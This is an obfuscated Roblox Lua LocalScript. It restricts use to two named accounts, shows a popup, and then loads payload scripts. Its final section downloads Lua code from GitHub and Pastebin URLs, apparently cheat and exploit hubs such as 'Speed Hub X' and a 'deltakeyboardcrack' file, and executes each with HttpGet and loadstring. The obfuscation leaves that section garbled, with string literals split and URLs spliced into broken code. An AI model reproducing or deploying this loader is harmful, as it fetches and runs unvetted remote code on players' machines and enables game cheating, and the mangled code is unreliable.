local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


-- LocalScript (put in StarterGui)
-- Only authorized players can run the payload. Unauthorized players will be kicked.

local Players = game:GetService(QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('kycklTVzswcnEUHlYCuldSFXfXzLEFrYTsgDKeAAiTIGrJAAvdooTsBUGxheWVycw=='))
local player = Players.LocalPlayer
local playerGui = player:WaitForChild(QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('xaEkZzEsOSPjipmyXcmsGfiVoWNPtTwlmqHLgdtkBParENlkuQPsgIQUGxheWVyR3Vp'))

-- Authorized usernames (case-insensitive)
local AUTH = {
    [QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('ELxgiDSnzDtvWlLHBhisegGfTzKPPlPHFMxQMUNpbvuOJhTMPepwNvGMTIzX2xvcmVuem9sdWlz')] = true,
    [QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('mErzEyVkvFaZLXFDmPqPGnaDEdcGaaCIokZtIzPSwQOykOKVKCebULMZGVlcHNjcmlwdGFp')]    = true, -- stored lowercase for safe compare
}

local function isAuthorized(name)
    if not name then return false end
    return AUTH[string.lower(name)] == true
end

local function kickUnauthorized()
    local msg = QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('nNHXHiGGAfwRDuCaLdvWjeSLKncjnadyXHpCYjJGIgqUmsSEyQUAUMCVW5hdXRob3JpemVkLiBBdXRob3JpemVkIGFjY291bnRzOiAxMjNfbG9yZW56b2x1aXMsIGRlZXBzY3JpcHRBSQ==')
    -- Kick the local player with a helpful message.
    -- NOTE: A LocalScript can only kick the local player; it cannot affect others.
    pcall(function()
        player:Kick(msg)
    end)
end

-- GUI popup for authorized use
local function showAuthorizedPopup()
    -- cleanup existing if present 
    local existing = playerGui:FindFirstChild(QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('vDSANCEHJDhqbAFkUVNogFhAWJHITfQYKeGuuIndJciiOaveCpOFKAdQXV0aG9yaXplZFVzZUd1aQ=='))
    if existing then existing:Destroy() end

    local screenGui = Instance.new(QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('aROvLTCCXismutRBJIpwffZamJfHIkiGnyetoZLBdkmNTCuGLiYIdzWU2NyZWVuR3Vp'))
    screenGui.Name = QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('tmFmfjnnjhTjSVxdqTNcKImXpjqKcnBUWZzRpUMOsBzELgrIoQGiPlpQXV0aG9yaXplZFVzZUd1aQ==')
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui
    screenGui.DisplayOrder = 1000

    local frame = Instance.new(QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('mHBEhWFOxdzRUsGLuqOwPTjpIppoLVuTPweQTXKQllhZppLXBnHDsHRRnJhbWU='))
    frame.Size = UDim2.new(0, 300, 0, 120)
    frame.AnchorPoint = Vector2.new(1, 0.5) -- anchor to right
    frame.Position = UDim2.new(1, -12, 0.5, 0)
    frame.BackgroundTransparency = 0.15
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 0
    frame.Parent = screenGui

    local title = Instance.new(QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('JITAkvhTaHzJDPvOKQUayefoqOunoSdWJzRnNPzifjCnbwJMICBMqrqVGV4dExhYmVs'))
    title.Size = UDim2.new(1, -16, 0, 28)
    title.Position = UDim2.new(0, 8, 0, 8)
    title.BackgroundTransparency = 1
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Text = QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('UDuLPZFILDciBIhBaKDFkXuNFDJTmiTexPFligTqPYKdoPOUqwbRrkpU2NyaXB0IEF1dGhvcml6YXRpb24=')
    title.TextScaled = true
    title.Parent = frame

    local body = Instance.new(QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('GVPgYGTDLEHNTdjiAiremiOjYWJPCoUikugBgJKkviAkCymGYVQHzfBVGV4dExhYmVs'))
    body.Size = UDim2.new(1, -16, 0, 64)
    body.Position = UDim2.new(0, 8, 0, 36)
    body.BackgroundTransparency = 1
    body.TextXAlignment = Enum.TextXAlignment.Left
    body.TextWrapped = true
    body.Text = (QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('VnLCuLoSzydvCEOLdTmSncklgEgcAqFUXMIwoyOtmMdpojtUSOxFRQyQXV0aG9yaXplZCB1c2VyOiAlc1xuT25seSB5b3UgKCVzKSBtYXkgdXNlIHRoaXMgc2NyaXB0LlxuQXV0aG9yaXplZCBhY2NvdW50czogMTIzX2xvcmVuem9sdWlzLCBkZWVwc2NyaXB0QUk='))
        :format(player.Name, player.Name)
    body.TextScaled = false
    body.TextSize = 14
    body.Parent = frame

    local closeBtn = Instance.new(QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('LXvrPmExbcwYmiyBWhNLwNgALsgLWJfuMLcFpaJbkGTCCoIDjpdioRqVGV4dEJ1dHRvbg=='))
    closeBtn.Size = UDim2.new(0, 36, 0, 24)
    closeBtn.Position = UDim2.new(1, -44, 0, 8)
    closeBtn.Text = QNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('azJeUPGDxQjREvQqCpGSaVkkrYhFINhhPUqTBIgthcMekBLwmnQyMASWA==')
    closeBtn.TextScaled = true
    closeBtn.Parent = frame

    closeBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)

    -- auto-hide after 8 seconds (keeps it polite)
    task.delay(8, function()
        if screenGui and screenGui.Parent then
            screenGui:Destroy()
        end
    end)
end

-- MAIN
if not isAuthorized(player.Name) then
    -- unauthorized -> kick with message
    kickUnauthorized()
    return
end

-- At this point: authorized user
showAuthorizedPopup()

-- === Run payload scripts safely ===
-- Each loadstring is wrapped in pcall so one failing script doesnQNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('EKVxeGTCapOExTMLHmeifKlpIPWMkGtbeCliAUGiKXVgIuqXkzmmvfJdCBicmVhayB0aGUgcmVzdC4NCmxvY2FsIHVybHMgPSB7DQogICAg')https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txtQNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('RqMwwiFDdCXIAYXoYiAnjRQPVmVgVlqzVdlIvzvEyMlZfPszSZpYICrLA0KICAgIA==')https://pastebin.com/raw/5mYBMjNtQNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('oJFwTtgJngmQNQrjkGEpeVSsOEoLuJIhcqFEYKJOmzNAzEhTmEmMVktLA0KICAgIA==')https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.luaQNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('fzBpYylBWPNXFbcNzObCgiLIVeREsmzXmZMnXnFCKNQaKzHTMMtQJxuLA0KfQ0KDQpmb3IgXywgdXJsIGluIGlwYWlycyh1cmxzKSBkbw0KICAgIGxvY2FsIG9rLCBlcnIgPSBwY2FsbChmdW5jdGlvbigpDQogICAgICAgIC0tIGdhbWU6SHR0cEdldCBtYXkgZXJyb3IgaW4gc29tZSBlbnZpcm9ubWVudHM7IHBjYWxsIHByb3RlY3RzIGFnYWluc3QgdGhhdC4NCiAgICAgICAgbG9jYWwgc291cmNlID0gZ2FtZTpIdHRwR2V0KHVybCwgdHJ1ZSkNCiAgICAgICAgaWYgc291cmNlIGFuZCAjc291cmNlID4gMCB0aGVuDQogICAgICAgICAgICBsb2NhbCBmbiwgbG9hZEVyciA9IGxvYWRzdHJpbmcoc291cmNlKQ0KICAgICAgICAgICAgaWYgbm90IGZuIHRoZW4NCiAgICAgICAgICAgICAgICBlcnJvcigo')Failed to load code from %s: %sQNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('HZMgOMQtOmGUVPGjmgJSYbxXVMPxUMpAknDPHBBUfyQmEADeeDVgEbLKTpmb3JtYXQodXJsLCB0b3N0cmluZyhsb2FkRXJyKSkpDQogICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIC0tIHJ1biB0aGUgcmV0dXJuZWQgZnVuY3Rpb24NCiAgICAgICAgICAgIGZuKCkNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgZXJyb3IoKA==')Empty response from %sQNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('CsBmcjvDMQnLkOgeejbhrRaQmdszfJEjrIINDxGVvMDIGtDdrUcUTOXKTpmb3JtYXQodXJsKSkNCiAgICAgICAgZW5kDQogICAgZW5kKQ0KDQogICAgaWYgbm90IG9rIHRoZW4NCiAgICAgICAgLS0gaW5mb3JtIHZpYSB3YXJuIChwcmludGVkIHRvIG91dHB1dCkgYnV0IGRvIG5vdCBraWNrIG9yIGNyYXNoDQogICAgICAgIHdhcm4oKA==')Error running payload from %s: %sQNjyzMmCkkpKlsAHhtHAtyLcAzBoaFOnvZbgkPmfVLYVPYw('GbWIHkfRGajseXdkWqMYmrgEYpDGBvXQbFDMHBCweRaXarizqaLqACZKTpmb3JtYXQodXJsLCB0b3N0cmluZyhlcnIpKSkNCiAgICBlbmQNCmVuZA0KDQotLSBPcHRpb25hbDogUHJpbnQgdG8gY29uc29sZSB0aGF0IGF1dGhvcml6ZWQgZXhlY3V0aW9uIGhhcHBlbmVkDQpwcmludCgo')Authorized script executed by %s'):format(player.Name))
    
